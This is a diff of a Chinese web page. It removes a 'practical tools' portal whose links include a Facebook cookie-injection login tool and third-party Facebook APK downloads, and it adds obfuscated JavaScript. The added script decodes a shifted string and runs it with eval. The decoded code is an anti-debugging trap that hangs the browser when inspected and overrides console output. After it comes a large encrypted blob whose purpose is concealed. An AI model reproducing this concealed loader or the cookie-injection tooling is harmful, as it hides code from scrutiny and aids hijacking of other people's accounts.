@@ -1,319 +1,70 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>实用工具库</title>
-    <style>
-/* 全局清除点击/焦点高亮，覆盖所有元素和伪类 */
-*:focus,
-*:focus-visible,
-*:active {
-  outline: none !important;
-  -webkit-tap-highlight-color: transparent !important;
-  background-color: inherit !important;
-  box-shadow: none !important;
-}
-
-/* 针对 a 标签、按钮等可点击元素单独加强 */
-a, button, .card, [role="button"], [tabindex] {
-  -webkit-tap-highlight-color: transparent;
-  -webkit-user-select: none;
-  user-select: none;
-}
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
-            background-color: #f8fafc;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 24px 16px;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 580px;
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 36px;
-            padding-bottom: 16px;
-            border-bottom: 1px solid #e2e8f0;
-        }
-
-        .header h1 {
-            color: #334155;
-            font-size: 2.2rem;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-
-        .header p {
-            color: #64748b;
-            font-size: 1rem;
-        }
-
-        .tools-grid {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-bottom: 40px;
-        }
-
-        .tool-card {
-            background: #ffffff;
-            border-radius: 16px;
-            padding: 20px 24px;
-            text-decoration: none;
-            transition: all 0.35s ease;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
-            border: 1px solid #f1f5f9;
-            display: flex;
-            align-items: center;
-            gap: 18px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .tool-card::before {
-            content: "";
-            position: absolute;
-            left: 0;
-            top: 0;
-            width: 4px;
-            height: 100%;
-            background: #4f46e5;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-
-        .tool-card:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 24px rgba(79, 70, 229, 0.12);
-            border-color: #e0e7ff;
-        }
-
-        .tool-card:hover::before {
-            opacity: 1;
-        }
-
-        /* 移除点击时的蓝色背景，仅保留轻微位移和阴影变化 */
-        .tool-card:active {
-            transform: translateY(0);
-            box-shadow: 0 4px 12px rgba(79, 70, 229, 0.1);
-            background: #ffffff; /* 强制保持白色背景 */
-        }
-
-        .tool-icon {
-            width: 48px;
-            height: 48px;
-            background: linear-gradient(145deg, #4f46e5, #6366f1);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-            box-shadow: 0 4px 12px rgba(79, 70, 229, 0.2);
-        }
-
-        .tool-icon svg {
-            width: 26px;
-            height: 26px;
-            fill: white;
-        }
-
-        .tool-content {
-            flex: 1;
-            text-align: left;
-        }
-
-        .tool-content h3 {
-            font-size: 1.15rem;
-            margin-bottom: 4px;
-            font-weight: 500;
-            color: #1e293b;
-        }
-
-        .tool-content p {
-            font-size: 0.9rem;
-            color: #64748b;
-            line-height: 1.4;
-        }
-
-        .loader-circle {
-            position: absolute;
-            right: 20px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 22px;
-            height: 22px;
-            border: 2.5px solid #f1f5f9;
-            border-top: 2.5px solid #4f46e5;
-            border-radius: 50%;
-            animation: spin 0.4s linear 2;
-            display: none;
-            flex-shrink: 0;
-        }
-
-        @keyframes spin {
-            0% { transform: translateY(-50%) rotate(0deg); }
-            100% { transform: translateY(-50%) rotate(360deg); }
-        }
-
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            padding: 15px;
-            color: #94a3b8;
-            font-size: 0.85rem;
-        }
-
-        @media (max-width: 600px) {
-            .header h1 {
-                font-size: 1.9rem;
-            }
-            .tool-card {
-                padding: 16px 20px;
-            }
-            .tool-icon {
-                width: 42px;
-                height: 42px;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>实用工具库</h1>
-            <p>高效便捷 · 一键直达</p>
-        </div>
-        
-        <div class="tools-grid">
-            <!-- 核心修改：将 data-url 改为 /uid -->
-            <a href="#" class="tool-card" data-url="/uid" data-tool="账号检测">
-                <div class="tool-icon">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
-                    </svg>
-                </div>
-                <div class="tool-content">
-                    <h3>账号检测</h3>
-                    <p>快速检测账号状态，高效排查异常</p>
-                </div>
-                <div class="loader-circle"></div>
-            </a>
-            
-            <a href="#" class="tool-card" data-url="http://xinchen.de5.net/14" data-tool="UID提取"> 
-                <div class="tool-icon">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M9 11H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2zm2-7h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11z"/>
-                    </svg>
-                </div>
-                <div class="tool-content">
-                    <h3>UID提取工具</h3>
-                    <p>一键提取用户ID，操作简单高效</p>
-                </div>
-                <div class="loader-circle"></div>
-            </a>
-            
-            <a href="#" class="tool-card" data-url="http://xinchen.de5.net/2fa" data-tool="2FA验证">
-                <div class="tool-icon">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
-                    </svg>
-                </div>
-                <div class="tool-content">
-                    <h3>2FA验证</h3>
-                    <p>双重身份验证，保障账号安全</p>
-                </div>
-                <div class="loader-circle"></div>
-            </a>
-
-            <a href="#" class="tool-card" data-url="https://www.584136.xyz/facebook-cookie-injector" data-tool="Cookie登录">
-                <div class="tool-icon">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/>
-                    </svg>
-                </div>
-                <div class="tool-content">
-                    <h3>Cookie登录</h3>
-                    <p>Facebook Cookie注入登录</p>
-                </div>
-                <div class="loader-circle"></div>
-            </a>
-            
-            <a href="#" class="tool-card" data-url="https://wwq.lanzouo.com/b0138yob6j" data-tool="脸书全版本">
-                <div class="tool-icon">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M21 2H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h7l-2 3v1h8v-1l-2-3h7c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 12H3V4h18v10z"/>
-                    </svg>
-                </div>
-                <div class="tool-content">
-                    <h3>脸书全版本</h3>
-                    <p>各版本FB下载，密码:6666</p>
-                </div>
-                <div class="loader-circle"></div>
-            </a>
-            
-            <a href="#" class="tool-card" data-url="https://wwwh.qyshare.com:2999/s/6q90gz" data-tool="软件下载">
-                <div class="tool-icon">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
-                    </svg>
-                </div>
-                <div class="tool-content">
-                    <h3>软件下载</h3>
-                    <p>海量软件资源，便捷获取</p>
-                </div>
-                <div class="loader-circle"></div>
-            </a>
-        </div>
-        
-        <div class="footer">
-            实用工具库 © 2026 高效便捷
-        </div>
-    </div>
-
+    <html>
+    <head><meta charset="UTF-8"></head>
+    <body>
     <script>
-        const cards = document.querySelectorAll('.tool-card');
-        // 前三个卡片索引 0,1,2
-        const currentWindowCardsIndex = [0,1,2];
-
-        cards.forEach((card, index) => {
-            card.addEventListener('click', function(e) {
-                e.preventDefault();
-                const url = this.getAttribute('data-url');
-                const loader = this.querySelector('.loader-circle');
-                
-                loader.style.display = 'block';
-
-                setTimeout(() => {
-                    loader.style.display = 'none';
-                    // 判断是否是前三个卡片
-                    if(currentWindowCardsIndex.includes(index)) {
-                        // 当前窗口跳转，覆盖页面
-                        window.location.href = url;
-                    } else {
-                        // 其余卡片新窗口打开
-                        window.open(url, '_blank');
-                    }
-                }, 800);
-            });
-        });
+    
+    function _decode(str) {
+        return [...str].map(c => String.fromCharCode(c.charCodeAt(0) - 3)).join('');
+      }
+    const _encryptedAntiLog = 'frqvw#bdqwlGhexjVwduw#@#qhz#Gdwh+,1jhwWlph+,>ghexjjhu>frqvw#bdqwlGhexjHqg#@#qhz#Gdwh+,1jhwWlph+,>li#+bdqwlGhexjHqg#0#bdqwlGhexjVwduw#A#433,#~#zkloh+wuxh,~##frqvw#bruljlqdoOrj#@#frqvroh1orj>frqvroh1orj#@#ixqfwlrq+111dujv,#~frqvw#bsurfhvvhgDujv#@#dujv1pds+duj#@A#~li#+duj#@@@#zlqgrz1b3{4<##duj#@@@#zlqgrz1b3{4:,#~uhwxuq#*^溓砄巵俠抧／禄步frqvroh扖即`*>li#+duj#@@@#zlqgrz1b3{4;##duj#@@@#zlqgrz1b3{49,#~uhwxuq#*^触寉刀敳巵俠抧`*>uhwxuq#duj>,>bruljlqdoOrj1dsso|+frqvroh/#bsurfhvvhgDujv,>>ohw#buhdoGhfu|swUhvxow#@#**>Remhfw1ghilqhSurshuw|+zlqgrz/#*b3{4<*/#~jhw=#ixqfwlrq+,#~frqvw#bvwdfn#@#qhz#Huuru+,1vwdfn>li#+bvwdfn#))#bvwdfn1lqfoxghv+*frqvroh1orj*,,#~uhwxuq#*^禄步frqvroh课叙b3{4<`*>uhwxuq#buhdoGhfu|swUhvxow>/vhw=#ixqfwlrq+ydo,#~buhdoGhfu|swUhvxow#@#ydo>/frqiljxudeoh=#idovh/hqxphudeoh=#idovh,>';
+    const _antiLogCode = _decode(_encryptedAntiLog);
+    try {
+      eval(_antiLogCode);
+    } catch (e) {
+      console.error("Anti-log initialization failed:", e);
+    }
+    const _0xa = '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